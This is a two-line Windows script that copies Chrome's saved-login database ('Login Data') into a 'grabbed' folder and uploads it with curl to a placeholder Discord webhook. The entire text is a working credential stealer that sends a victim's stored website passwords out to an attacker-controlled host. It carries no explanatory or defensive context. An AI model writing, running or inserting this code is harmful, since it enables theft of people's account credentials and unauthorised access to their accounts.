COPY "%localappdata%\Google\Chrome\User Data\Default\Login Data" "grabbed/data.txt"
curl -i -H "Accept: multipart/form-data" -H "Content-Type: multipart/form-data" -X POST -F "file1=@grabbed/data.txt" YOUR_DISCORD_WEBHOOK_LINK
